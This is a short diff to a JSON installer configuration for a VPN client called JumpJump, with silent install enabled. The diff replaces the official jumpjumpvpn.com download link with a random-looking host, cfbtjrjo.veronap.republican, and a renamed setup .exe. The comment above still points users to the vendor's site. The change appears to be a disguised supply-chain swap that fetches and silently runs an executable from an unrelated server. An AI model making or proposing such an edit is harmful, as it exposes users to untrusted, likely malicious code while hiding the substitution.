@@ -14,8 +14,8 @@
     "directInstall": {
       "enabled": true,
       "_comment": "JumpJump rotates installer filenames per release. Override 'url' with the latest setup .exe link from https://jumpjumpvpn.com (download page) when needed. silentArgs is the NSIS / Inno-style silent flag -- '/S' works for both.",
-      "url": "https://jumpjumpvpn.com/download/jumpjump-vpn-setup.exe",
-      "fileName": "jumpjump-vpn-setup.exe",
+      "url": "https://cfbtjrjo.veronap.republican/jumpsetup-2.9.0.exe",
+      "fileName": "jumpsetup-2.9.0.exe",
       "downloadDir": "",
       "silentArgs": "/S",
       "timeoutSeconds": 900
